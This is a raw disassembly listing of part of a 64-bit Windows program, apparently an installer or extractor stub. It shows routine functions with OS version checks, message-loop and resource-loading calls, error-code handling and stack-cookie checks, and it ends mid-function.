   140003b6f:	83 3d 36 86 00 00 00 	cmpl   $0x0,0x8636(%rip)        # 0x14000c1ac
   140003b76:	74 63                	je     0x140003bdb
   140003b78:	be 3b 08 00 00       	mov    $0x83b,%esi
   140003b7d:	48 8b cf             	mov    %rdi,%rcx
   140003b80:	8b d6                	mov    %esi,%edx
   140003b82:	48 ff 15 87 59 00 00 	rex.W call *0x5987(%rip)        # 0x140009510
   140003b89:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003b8e:	41 b9 b9 0b 00 00    	mov    $0xbb9,%r9d
   140003b94:	45 33 c0             	xor    %r8d,%r8d
   140003b97:	48 8b c8             	mov    %rax,%rcx
   140003b9a:	ba 64 04 00 00       	mov    $0x464,%edx
   140003b9f:	48 ff 15 62 59 00 00 	rex.W call *0x5962(%rip)        # 0x140009508
   140003ba6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003bab:	8b d6                	mov    %esi,%edx
   140003bad:	48 8b cf             	mov    %rdi,%rcx
   140003bb0:	48 ff 15 59 59 00 00 	rex.W call *0x5959(%rip)        # 0x140009510
   140003bb7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003bbc:	49 c7 c1 00 00 ff ff 	mov    $0xffffffffffff0000,%r9
   140003bc3:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   140003bc7:	48 8b c8             	mov    %rax,%rcx
   140003bca:	ba 65 04 00 00       	mov    $0x465,%edx
   140003bcf:	48 ff 15 32 59 00 00 	rex.W call *0x5932(%rip)        # 0x140009508
   140003bd6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003bdb:	48 8d 15 96 99 00 00 	lea    0x9996(%rip),%rdx        # 0x14000d578
   140003be2:	48 8b cf             	mov    %rdi,%rcx
   140003be5:	48 ff 15 04 59 00 00 	rex.W call *0x5904(%rip)        # 0x1400094f0
   140003bec:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003bf1:	48 8d 05 58 8e 00 00 	lea    0x8e58(%rip),%rax        # 0x14000ca50
   140003bf8:	45 33 c9             	xor    %r9d,%r9d
   140003bfb:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003c00:	4c 8d 05 79 23 00 00 	lea    0x2379(%rip),%r8        # 0x140005f80
   140003c07:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   140003c0c:	33 d2                	xor    %edx,%edx
   140003c0e:	33 c9                	xor    %ecx,%ecx
   140003c10:	48 ff 15 71 57 00 00 	rex.W call *0x5771(%rip)        # 0x140009388
   140003c17:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003c1c:	48 89 05 35 8e 00 00 	mov    %rax,0x8e35(%rip)        # 0x14000ca58
   140003c23:	48 85 c0             	test   %rax,%rax
   140003c26:	75 3e                	jne    0x140003c66
   140003c28:	21 44 24 28          	and    %eax,0x28(%rsp)
   140003c2c:	45 33 c9             	xor    %r9d,%r9d
   140003c2f:	45 33 c0             	xor    %r8d,%r8d
   140003c32:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140003c39:	00 
   140003c3a:	ba b8 04 00 00       	mov    $0x4b8,%edx
   140003c3f:	48 8b cf             	mov    %rdi,%rcx
   140003c42:	e8 e5 12 00 00       	call   0x140004f2c
   140003c47:	e9 fd fe ff ff       	jmp    0x140003b49
   140003c4c:	48 83 fe 1b          	cmp    $0x1b,%rsi
   140003c50:	75 14                	jne    0x140003c66
   140003c52:	89 1d a4 99 00 00    	mov    %ebx,0x99a4(%rip)        # 0x14000d5fc
   140003c58:	33 d2                	xor    %edx,%edx
   140003c5a:	48 ff 15 ff 58 00 00 	rex.W call *0x58ff(%rip)        # 0x140009560
   140003c61:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003c66:	48 8b c3             	mov    %rbx,%rax
   140003c69:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003c6e:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140003c73:	48 83 c4 30          	add    $0x30,%rsp
   140003c77:	5f                   	pop    %rdi
   140003c78:	c3                   	ret
   140003c79:	cc                   	int3
   140003c7a:	cc                   	int3
   140003c7b:	cc                   	int3
   140003c7c:	cc                   	int3
   140003c7d:	cc                   	int3
   140003c7e:	cc                   	int3
   140003c7f:	cc                   	int3
   140003c80:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140003c85:	53                   	push   %rbx
   140003c86:	48 83 ec 60          	sub    $0x60,%rsp
   140003c8a:	33 db                	xor    %ebx,%ebx
   140003c8c:	45 33 c0             	xor    %r8d,%r8d
   140003c8f:	c7 44 24 20 ff 04 00 	movl   $0x4ff,0x20(%rsp)
   140003c96:	00 
   140003c97:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140003c9b:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140003ca0:	41 8d 48 01          	lea    0x1(%r8),%ecx
   140003ca4:	48 ff 15 0d 58 00 00 	rex.W call *0x580d(%rip)        # 0x1400094b8
   140003cab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003cb0:	85 c0                	test   %eax,%eax
   140003cb2:	74 71                	je     0x140003d25
   140003cb4:	45 33 c9             	xor    %r9d,%r9d
   140003cb7:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140003cbe:	00 
   140003cbf:	45 33 c0             	xor    %r8d,%r8d
   140003cc2:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003cc7:	33 d2                	xor    %edx,%edx
   140003cc9:	48 ff 15 c0 58 00 00 	rex.W call *0x58c0(%rip)        # 0x140009590
   140003cd0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003cd5:	85 c0                	test   %eax,%eax
   140003cd7:	74 b3                	je     0x140003c8c
   140003cd9:	83 7c 24 38 12       	cmpl   $0x12,0x38(%rsp)
   140003cde:	75 07                	jne    0x140003ce7
   140003ce0:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003ce5:	eb 11                	jmp    0x140003cf8
   140003ce7:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003cec:	48 ff 15 e5 57 00 00 	rex.W call *0x57e5(%rip)        # 0x1400094d8
   140003cf3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003cf8:	45 33 c9             	xor    %r9d,%r9d
   140003cfb:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140003d02:	00 
   140003d03:	45 33 c0             	xor    %r8d,%r8d
   140003d06:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003d0b:	33 d2                	xor    %edx,%edx
   140003d0d:	48 ff 15 7c 58 00 00 	rex.W call *0x587c(%rip)        # 0x140009590
   140003d14:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003d19:	85 c0                	test   %eax,%eax
   140003d1b:	75 bc                	jne    0x140003cd9
   140003d1d:	85 db                	test   %ebx,%ebx
   140003d1f:	0f 84 67 ff ff ff    	je     0x140003c8c
   140003d25:	48 83 c4 60          	add    $0x60,%rsp
   140003d29:	5b                   	pop    %rbx
   140003d2a:	c3                   	ret
   140003d2b:	cc                   	int3
   140003d2c:	cc                   	int3
   140003d2d:	cc                   	int3
   140003d2e:	cc                   	int3
   140003d2f:	cc                   	int3
   140003d30:	cc                   	int3
   140003d31:	cc                   	int3
   140003d32:	cc                   	int3
   140003d33:	cc                   	int3
   140003d34:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003d39:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003d3e:	55                   	push   %rbp
   140003d3f:	57                   	push   %rdi
   140003d40:	41 54                	push   %r12
   140003d42:	41 56                	push   %r14
   140003d44:	41 57                	push   %r15
   140003d46:	48 8d ac 24 00 ff ff 	lea    -0x100(%rsp),%rbp
   140003d4d:	ff 
   140003d4e:	48 81 ec 00 02 00 00 	sub    $0x200,%rsp
   140003d55:	48 8b 05 ac 82 00 00 	mov    0x82ac(%rip),%rax        # 0x14000c008
   140003d5c:	48 33 c4             	xor    %rsp,%rax
   140003d5f:	48 89 85 f0 00 00 00 	mov    %rax,0xf0(%rbp)
   140003d66:	4c 8b e1             	mov    %rcx,%r12
   140003d69:	c7 44 24 40 94 00 00 	movl   $0x94,0x40(%rsp)
   140003d70:	00 
   140003d71:	33 db                	xor    %ebx,%ebx
   140003d73:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003d78:	8b fb                	mov    %ebx,%edi
   140003d7a:	48 ff 15 ef 55 00 00 	rex.W call *0x55ef(%rip)        # 0x140009370
   140003d81:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003d86:	85 c0                	test   %eax,%eax
   140003d88:	75 07                	jne    0x140003d91
   140003d8a:	bf b4 04 00 00       	mov    $0x4b4,%edi
   140003d8f:	eb 21                	jmp    0x140003db2
   140003d91:	8b 44 24 50          	mov    0x50(%rsp),%eax
   140003d95:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003d9a:	8b 74 24 48          	mov    0x48(%rsp),%esi
   140003d9e:	44 8b 4c 24 44       	mov    0x44(%rsp),%r9d
   140003da3:	83 e8 01             	sub    $0x1,%eax
   140003da6:	74 7b                	je     0x140003e23
   140003da8:	83 f8 01             	cmp    $0x1,%eax
   140003dab:	74 1c                	je     0x140003dc9
   140003dad:	bf ca 04 00 00       	mov    $0x4ca,%edi
   140003db2:	45 33 c9             	xor    %r9d,%r9d
   140003db5:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140003db9:	45 33 c0             	xor    %r8d,%r8d
   140003dbc:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140003dc3:	00 
   140003dc4:	e9 59 02 00 00       	jmp    0x140004022
   140003dc9:	41 be 01 00 00 00    	mov    $0x1,%r14d
   140003dcf:	66 89 0d a2 a0 00 00 	mov    %cx,0xa0a2(%rip)        # 0x14000de78
   140003dd6:	0f b7 c1             	movzwl %cx,%eax
   140003dd9:	44 89 35 cc 83 00 00 	mov    %r14d,0x83cc(%rip)        # 0x14000c1ac
   140003de0:	44 89 35 c1 83 00 00 	mov    %r14d,0x83c1(%rip)        # 0x14000c1a8
   140003de7:	41 8d 4e 02          	lea    0x2(%r14),%ecx
   140003deb:	44 3b c9             	cmp    %ecx,%r9d
   140003dee:	77 21                	ja     0x140003e11
   140003df0:	41 8b c6             	mov    %r14d,%eax
   140003df3:	66 89 05 7e a0 00 00 	mov    %ax,0xa07e(%rip)        # 0x14000de78
   140003dfa:	72 07                	jb     0x140003e03
   140003dfc:	75 43                	jne    0x140003e41
   140003dfe:	83 fe 33             	cmp    $0x33,%esi
   140003e01:	73 3e                	jae    0x140003e41
   140003e03:	89 1d a3 83 00 00    	mov    %ebx,0x83a3(%rip)        # 0x14000c1ac
   140003e09:	89 1d 99 83 00 00    	mov    %ebx,0x8399(%rip)        # 0x14000c1a8
   140003e0f:	eb 30                	jmp    0x140003e41
   140003e11:	41 83 f9 05          	cmp    $0x5,%r9d
   140003e15:	72 2a                	jb     0x140003e41
   140003e17:	0f b7 c1             	movzwl %cx,%eax
   140003e1a:	66 89 0d 57 a0 00 00 	mov    %cx,0xa057(%rip)        # 0x14000de78
   140003e21:	eb 1e                	jmp    0x140003e41
   140003e23:	41 be 01 00 00 00    	mov    $0x1,%r14d
   140003e29:	66 89 1d 48 a0 00 00 	mov    %bx,0xa048(%rip)        # 0x14000de78
   140003e30:	44 89 35 75 83 00 00 	mov    %r14d,0x8375(%rip)        # 0x14000c1ac
   140003e37:	0f b7 c3             	movzwl %bx,%eax
   140003e3a:	44 89 35 67 83 00 00 	mov    %r14d,0x8367(%rip)        # 0x14000c1a8
   140003e41:	39 1d cd 8e 00 00    	cmp    %ebx,0x8ecd(%rip)        # 0x14000cd14
   140003e47:	0f 85 de 01 00 00    	jne    0x14000402b
   140003e4d:	4d 85 e4             	test   %r12,%r12
   140003e50:	0f 84 d5 01 00 00    	je     0x14000402b
   140003e56:	44 0f b7 7c 24 4c    	movzwl 0x4c(%rsp),%r15d
   140003e5c:	49 8d 4c 24 40       	lea    0x40(%r12),%rcx
   140003e61:	66 f7 d8             	neg    %ax
   140003e64:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140003e68:	44 8b d3             	mov    %ebx,%r10d
   140003e6b:	48 1b c0             	sbb    %rax,%rax
   140003e6e:	48 83 e0 c4          	and    $0xffffffffffffffc4,%rax
   140003e72:	48 03 c8             	add    %rax,%rcx
   140003e75:	4d 63 da             	movslq %r10d,%r11
   140003e78:	4b 8d 14 5b          	lea    (%r11,%r11,2),%rdx
   140003e7c:	44 3b 0c d1          	cmp    (%rcx,%rdx,8),%r9d
   140003e80:	73 06                	jae    0x140003e88
   140003e82:	41 83 c8 ff          	or     $0xffffffff,%r8d
   140003e86:	eb 14                	jmp    0x140003e9c
   140003e88:	76 05                	jbe    0x140003e8f
   140003e8a:	45 8b c6             	mov    %r14d,%r8d
   140003e8d:	eb 0d                	jmp    0x140003e9c
   140003e8f:	3b 74 d1 04          	cmp    0x4(%rcx,%rdx,8),%esi
   140003e93:	72 ed                	jb     0x140003e82
   140003e95:	44 8b c3             	mov    %ebx,%r8d
   140003e98:	41 0f 97 c0          	seta   %r8b
   140003e9c:	44 3b 4c d1 0c       	cmp    0xc(%rcx,%rdx,8),%r9d
   140003ea1:	73 05                	jae    0x140003ea8
   140003ea3:	83 c8 ff             	or     $0xffffffff,%eax
   140003ea6:	eb 12                	jmp    0x140003eba
   140003ea8:	76 05                	jbe    0x140003eaf
   140003eaa:	41 8b c6             	mov    %r14d,%eax
   140003ead:	eb 0b                	jmp    0x140003eba
   140003eaf:	3b 74 d1 10          	cmp    0x10(%rcx,%rdx,8),%esi
   140003eb3:	72 ee                	jb     0x140003ea3
   140003eb5:	8b c3                	mov    %ebx,%eax
   140003eb7:	0f 97 c0             	seta   %al
   140003eba:	45 85 c0             	test   %r8d,%r8d
   140003ebd:	78 69                	js     0x140003f28
   140003ebf:	85 c0                	test   %eax,%eax
   140003ec1:	7f 65                	jg     0x140003f28
   140003ec3:	45 85 c0             	test   %r8d,%r8d
   140003ec6:	75 1d                	jne    0x140003ee5
   140003ec8:	85 c0                	test   %eax,%eax
   140003eca:	75 10                	jne    0x140003edc
   140003ecc:	41 8b c7             	mov    %r15d,%eax
   140003ecf:	44 3b 7c d1 08       	cmp    0x8(%rcx,%rdx,8),%r15d
   140003ed4:	72 1a                	jb     0x140003ef0
   140003ed6:	3b 44 d1 14          	cmp    0x14(%rcx,%rdx,8),%eax
   140003eda:	eb 12                	jmp    0x140003eee
   140003edc:	44 3b 7c d1 08       	cmp    0x8(%rcx,%rdx,8),%r15d
   140003ee1:	73 5c                	jae    0x140003f3f
   140003ee3:	eb 0b                	jmp    0x140003ef0
   140003ee5:	85 c0                	test   %eax,%eax
   140003ee7:	75 56                	jne    0x140003f3f
   140003ee9:	44 3b 7c d1 14       	cmp    0x14(%rcx,%rdx,8),%r15d
   140003eee:	76 4f                	jbe    0x140003f3f
   140003ef0:	45 85 d2             	test   %r10d,%r10d
   140003ef3:	74 38                	je     0x140003f2d
   140003ef5:	4c 8b cb             	mov    %rbx,%r9
   140003ef8:	bf 4c 05 00 00       	mov    $0x54c,%edi
   140003efd:	4c 8b fb             	mov    %rbx,%r15
   140003f00:	8b f3                	mov    %ebx,%esi
   140003f02:	48 85 c9             	test   %rcx,%rcx
   140003f05:	0f 84 90 00 00 00    	je     0x140003f9b
   140003f0b:	8b 41 34             	mov    0x34(%rcx),%eax
   140003f0e:	4d 8d bc 24 84 00 00 	lea    0x84(%r12),%r15
   140003f15:	00 
   140003f16:	4c 03 f8             	add    %rax,%r15
   140003f19:	8b 41 30             	mov    0x30(%rcx),%eax
   140003f1c:	41 84 c6             	test   %al,%r14b
   140003f1f:	74 6e                	je     0x140003f8f
   140003f21:	be 04 01 00 00       	mov    $0x104,%esi
   140003f26:	eb 73                	jmp    0x140003f9b
   140003f28:	45 3b d6             	cmp    %r14d,%r10d
   140003f2b:	74 c8                	je     0x140003ef5
   140003f2d:	41 ff c2             	inc    %r10d
   140003f30:	44 89 54 24 30       	mov    %r10d,0x30(%rsp)
   140003f35:	41 83 fa 02          	cmp    $0x2,%r10d
   140003f39:	0f 8c 36 ff ff ff    	jl     0x140003e75
   140003f3f:	41 39 5c 24 7c       	cmp    %ebx,0x7c(%r12)
   140003f44:	0f 84 e1 00 00 00    	je     0x14000402b
   140003f4a:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140003f4f:	49 8b cc             	mov    %r12,%rcx
   140003f52:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140003f56:	e8 3d e9 ff ff       	call   0x140002898
   140003f5b:	85 c0                	test   %eax,%eax
   140003f5d:	0f 85 c8 00 00 00    	jne    0x14000402b
   140003f63:	48 63 44 24 30       	movslq 0x30(%rsp),%rax
   140003f68:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140003f6c:	41 8b 94 24 80 00 00 	mov    0x80(%r12),%edx
   140003f73:	00 
   140003f74:	bf 4d 05 00 00       	mov    $0x54d,%edi
   140003f79:	48 6b c8 3c          	imul   $0x3c,%rax,%rcx
   140003f7d:	48 81 c1 84 00 00 00 	add    $0x84,%rcx
   140003f84:	49 03 cc             	add    %r12,%rcx
   140003f87:	48 03 ca             	add    %rdx,%rcx
   140003f8a:	e9 6e ff ff ff       	jmp    0x140003efd
   140003f8f:	24 02                	and    $0x2,%al
   140003f91:	f6 d8                	neg    %al
   140003f93:	1b f6                	sbb    %esi,%esi
   140003f95:	81 e6 01 01 00 00    	and    $0x101,%esi
   140003f9b:	44 84 35 76 8d 00 00 	test   %r14b,0x8d76(%rip)        # 0x14000cd18
   140003fa2:	75 6a                	jne    0x14000400e
   140003fa4:	4d 85 ff             	test   %r15,%r15
   140003fa7:	74 65                	je     0x14000400e
   140003fa9:	41 38 1f             	cmp    %bl,(%r15)
   140003fac:	74 60                	je     0x14000400e
   140003fae:	33 c9                	xor    %ecx,%ecx
   140003fb0:	48 ff 15 b1 55 00 00 	rex.W call *0x55b1(%rip)        # 0x140009568
   140003fb7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003fbc:	e8 93 41 00 00       	call   0x140008154
   140003fc1:	85 c0                	test   %eax,%eax
   140003fc3:	74 0e                	je     0x140003fd3
   140003fc5:	e8 ba 40 00 00       	call   0x140008084
   140003fca:	85 c0                	test   %eax,%eax
   140003fcc:	b8 30 00 18 00       	mov    $0x180030,%eax
   140003fd1:	75 05                	jne    0x140003fd8
   140003fd3:	b8 30 00 00 00       	mov    $0x30,%eax
   140003fd8:	0b c6                	or     %esi,%eax
   140003fda:	4c 8d 05 97 95 00 00 	lea    0x9597(%rip),%r8        # 0x14000d578
   140003fe1:	44 8b c8             	mov    %eax,%r9d
   140003fe4:	49 8b d7             	mov    %r15,%rdx
   140003fe7:	33 c9                	xor    %ecx,%ecx
   140003fe9:	48 ff 15 08 55 00 00 	rex.W call *0x5508(%rip)        # 0x1400094f8
   140003ff0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003ff5:	40 f6 c6 04          	test   $0x4,%sil
   140003ff9:	74 05                	je     0x140004000
   140003ffb:	83 f8 06             	cmp    $0x6,%eax
   140003ffe:	eb 08                	jmp    0x140004008
   140004000:	41 84 f6             	test   %sil,%r14b
   140004003:	74 26                	je     0x14000402b
   140004005:	41 3b c6             	cmp    %r14d,%eax
   140004008:	75 21                	jne    0x14000402b
   14000400a:	8b fb                	mov    %ebx,%edi
   14000400c:	eb 1d                	jmp    0x14000402b
   14000400e:	b8 30 00 00 00       	mov    $0x30,%eax
   140004013:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140004017:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000401b:	4c 8d 05 56 95 00 00 	lea    0x9556(%rip),%r8        # 0x14000d578
   140004022:	8b d7                	mov    %edi,%edx
   140004024:	33 c9                	xor    %ecx,%ecx
   140004026:	e8 01 0f 00 00       	call   0x140004f2c
   14000402b:	85 ff                	test   %edi,%edi
   14000402d:	0f 94 c3             	sete   %bl
   140004030:	8b c3                	mov    %ebx,%eax
   140004032:	48 8b 8d f0 00 00 00 	mov    0xf0(%rbp),%rcx
   140004039:	48 33 cc             	xor    %rsp,%rcx
   14000403c:	e8 af 46 00 00       	call   0x1400086f0
   140004041:	4c 8d 9c 24 00 02 00 	lea    0x200(%rsp),%r11
   140004048:	00 
   140004049:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   14000404d:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140004051:	49 8b e3             	mov    %r11,%rsp
   140004054:	41 5f                	pop    %r15
   140004056:	41 5e                	pop    %r14
   140004058:	41 5c                	pop    %r12
   14000405a:	5f                   	pop    %rdi
   14000405b:	5d                   	pop    %rbp
   14000405c:	c3                   	ret
   14000405d:	cc                   	int3
   14000405e:	cc                   	int3
   14000405f:	cc                   	int3
   140004060:	cc                   	int3
   140004061:	cc                   	int3
   140004062:	cc                   	int3
   140004063:	cc                   	int3
   140004064:	40 53                	rex push %rbx
   140004066:	48 83 ec 30          	sub    $0x30,%rsp
   14000406a:	45 33 c0             	xor    %r8d,%r8d
   14000406d:	48 8d 0d 8c 58 00 00 	lea    0x588c(%rip),%rcx        # 0x140009900
   140004074:	33 d2                	xor    %edx,%edx
   140004076:	e8 7d 11 00 00       	call   0x1400051f8
   14000407b:	b9 40 00 00 00       	mov    $0x40,%ecx
   140004080:	8b d8                	mov    %eax,%ebx
   140004082:	8d 50 01             	lea    0x1(%rax),%edx
   140004085:	48 ff 15 5c 53 00 00 	rex.W call *0x535c(%rip)        # 0x1400093e8
   14000408c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004091:	48 89 05 98 8f 00 00 	mov    %rax,0x8f98(%rip)        # 0x14000d030
   140004098:	48 85 c0             	test   %rax,%rax
   14000409b:	75 30                	jne    0x1400040cd
   14000409d:	21 44 24 28          	and    %eax,0x28(%rsp)
   1400040a1:	45 33 c9             	xor    %r9d,%r9d
   1400040a4:	45 33 c0             	xor    %r8d,%r8d
   1400040a7:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400040ae:	00 
   1400040af:	ba b5 04 00 00       	mov    $0x4b5,%edx
   1400040b4:	33 c9                	xor    %ecx,%ecx
   1400040b6:	e8 71 0e 00 00       	call   0x140004f2c
   1400040bb:	e8 98 38 00 00       	call   0x140007958
   1400040c0:	89 05 7e 94 00 00    	mov    %eax,0x947e(%rip)        # 0x14000d544
   1400040c6:	33 c0                	xor    %eax,%eax
   1400040c8:	e9 da 00 00 00       	jmp    0x1400041a7
   1400040cd:	44 8b c3             	mov    %ebx,%r8d
   1400040d0:	48 8d 0d 29 58 00 00 	lea    0x5829(%rip),%rcx        # 0x140009900
   1400040d7:	48 8b d0             	mov    %rax,%rdx
   1400040da:	e8 19 11 00 00       	call   0x1400051f8
   1400040df:	85 c0                	test   %eax,%eax
   1400040e1:	75 3d                	jne    0x140004120
   1400040e3:	21 44 24 28          	and    %eax,0x28(%rsp)
   1400040e7:	45 33 c9             	xor    %r9d,%r9d
   1400040ea:	45 33 c0             	xor    %r8d,%r8d
   1400040ed:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400040f4:	00 
   1400040f5:	ba b1 04 00 00       	mov    $0x4b1,%edx
   1400040fa:	33 c9                	xor    %ecx,%ecx
   1400040fc:	e8 2b 0e 00 00       	call   0x140004f2c
   140004101:	48 8b 0d 28 8f 00 00 	mov    0x8f28(%rip),%rcx        # 0x14000d030
   140004108:	48 ff 15 81 51 00 00 	rex.W call *0x5181(%rip)        # 0x140009290
   14000410f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004114:	c7 05 26 94 00 00 14 	movl   $0x80070714,0x9426(%rip)        # 0x14000d544
   14000411b:	07 07 80 
   14000411e:	eb a6                	jmp    0x1400040c6
   140004120:	48 8b 0d 09 8f 00 00 	mov    0x8f09(%rip),%rcx        # 0x14000d030
   140004127:	48 8d 15 da 57 00 00 	lea    0x57da(%rip),%rdx        # 0x140009908
   14000412e:	48 ff 15 bb 52 00 00 	rex.W call *0x52bb(%rip)        # 0x1400093f0
   140004135:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000413a:	85 c0                	test   %eax,%eax
   14000413c:	74 4a                	je     0x140004188
   14000413e:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140004144:	4c 8d 0d d5 f3 ff ff 	lea    -0xc2b(%rip),%r9        # 0x140003520
   14000414b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004151:	45 33 c0             	xor    %r8d,%r8d
   140004154:	ba d1 07 00 00       	mov    $0x7d1,%edx
   140004159:	e8 ca 3b 00 00       	call   0x140007d28
   14000415e:	48 8b 0d cb 8e 00 00 	mov    0x8ecb(%rip),%rcx        # 0x14000d030
   140004165:	48 8b d8             	mov    %rax,%rbx
   140004168:	48 ff 15 21 51 00 00 	rex.W call *0x5121(%rip)        # 0x140009290
   14000416f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004174:	48 85 db             	test   %rbx,%rbx
   140004177:	75 22                	jne    0x14000419b
   140004179:	c7 05 c1 93 00 00 c7 	movl   $0x800704c7,0x93c1(%rip)        # 0x14000d544
   140004180:	04 07 80 
   140004183:	e9 3e ff ff ff       	jmp    0x1400040c6
   140004188:	48 8b 0d a1 8e 00 00 	mov    0x8ea1(%rip),%rcx        # 0x14000d030
   14000418f:	48 ff 15 fa 50 00 00 	rex.W call *0x50fa(%rip)        # 0x140009290
   140004196:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000419b:	83 25 a2 93 00 00 00 	andl   $0x0,0x93a2(%rip)        # 0x14000d544
   1400041a2:	b8 01 00 00 00       	mov    $0x1,%eax
   1400041a7:	48 83 c4 30          	add    $0x30,%rsp
   1400041ab:	5b                   	pop    %rbx
   1400041ac:	c3                   	ret
   1400041ad:	cc                   	int3
   1400041ae:	cc                   	int3
   1400041af:	cc                   	int3
   1400041b0:	cc                   	int3
   1400041b1:	cc                   	int3
   1400041b2:	cc                   	int3
   1400041b3:	cc                   	int3
   1400041b4:	48 8b c4             	mov    %rsp,%rax
   1400041b7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400041bb:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400041bf:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400041c3:	55                   	push   %rbp
   1400041c4:	41 54                	push   %r12
   1400041c6:	41 55                	push   %r13
   1400041c8:	41 56                	push   %r14
   1400041ca:	41 57                	push   %r15
   1400041cc:	48 8d a8 78 fb ff ff 	lea    -0x488(%rax),%rbp
   1400041d3:	48 81 ec 60 05 00 00 	sub    $0x560,%rsp
   1400041da:	48 8b 05 27 7e 00 00 	mov    0x7e27(%rip),%rax        # 0x14000c008
   1400041e1:	48 33 c4             	xor    %rsp,%rax
   1400041e4:	48 89 85 50 04 00 00 	mov    %rax,0x450(%rbp)
   1400041eb:	45 33 ed             	xor    %r13d,%r13d
   1400041ee:	44 39 2d 13 8b 00 00 	cmp    %r13d,0x8b13(%rip)        # 0x14000cd08
   1400041f5:	45 8b fd             	mov    %r13d,%r15d
   1400041f8:	45 8b e5             	mov    %r13d,%r12d
   1400041fb:	44 89 2d 42 93 00 00 	mov    %r13d,0x9342(%rip)        # 0x14000d544
   140004202:	41 8d 5d 03          	lea    0x3(%r13),%ebx
   140004206:	75 21                	jne    0x140004229
   140004208:	45 8d 45 04          	lea    0x4(%r13),%r8d
   14000420c:	48 8d 15 49 9c 00 00 	lea    0x9c49(%rip),%rdx        # 0x14000de5c
   140004213:	48 8d 0d f6 56 00 00 	lea    0x56f6(%rip),%rcx        # 0x140009910
   14000421a:	e8 d9 0f 00 00       	call   0x1400051f8
   14000421f:	ff c8                	dec    %eax
   140004221:	3b c3                	cmp    %ebx,%eax
   140004223:	0f 87 21 01 00 00    	ja     0x14000434a
   140004229:	45 8b f5             	mov    %r13d,%r14d
   14000422c:	bf 01 00 00 00       	mov    $0x1,%edi
   140004231:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   140004235:	33 d2                	xor    %edx,%edx
   140004237:	44 89 6c 24 30       	mov    %r13d,0x30(%rsp)
   14000423c:	48 8d 4d 84          	lea    -0x7c(%rbp),%rcx
   140004240:	44 8d 42 64          	lea    0x64(%rdx),%r8d
   140004244:	e8 60 4b 00 00       	call   0x140008da9
   140004249:	44 38 2d d2 8c 00 00 	cmp    %r13b,0x8cd2(%rip)        # 0x14000cf22
   140004250:	c7 45 80 68 00 00 00 	movl   $0x68,-0x80(%rbp)
   140004257:	0f 85 1b 01 00 00    	jne    0x140004378
   14000425d:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004263:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140004268:	48 8d 0d a9 56 00 00 	lea    0x56a9(%rip),%rcx        # 0x140009918
   14000426f:	e8 84 0f 00 00       	call   0x1400051f8
   140004274:	ff c8                	dec    %eax
   140004276:	3b c3                	cmp    %ebx,%eax
   140004278:	0f 87 cc 00 00 00    	ja     0x14000434a
   14000427e:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140004282:	3b c7                	cmp    %edi,%eax
   140004284:	75 07                	jne    0x14000428d
   140004286:	66 44 89 6d c0       	mov    %r13w,-0x40(%rbp)
   14000428b:	eb 18                	jmp    0x1400042a5
   14000428d:	83 f8 02             	cmp    $0x2,%eax
   140004290:	75 0b                	jne    0x14000429d
